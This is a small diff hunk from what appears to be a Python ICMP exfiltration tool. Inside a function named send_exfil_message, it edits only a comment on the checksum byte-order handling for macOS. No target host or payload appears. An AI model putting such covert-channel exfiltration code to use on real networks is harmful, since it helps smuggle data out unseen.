@@ -84,7 +84,7 @@ def send_exfil_message():
 
     # Get the right checksum, and put in the header "darwin" for MAC OS
     if sys.platform == 'darwin':
-        csum = socket.htons(csum) & 0xffff #Convert 16-bit integers from host to network byte order FOR MAC OS?.
+        csum = socket.htons(csum) & 0xffff #Convert 16-bit integers from host to network byte order for MAC OS.
 
     # Pack the header with the checksum
     header = struct.pack(ICMP_HEADER_FMT, ICMP_TYPE, ICMP_CODE, csum, ICMP_ID, ICMP_SEQUENCE)
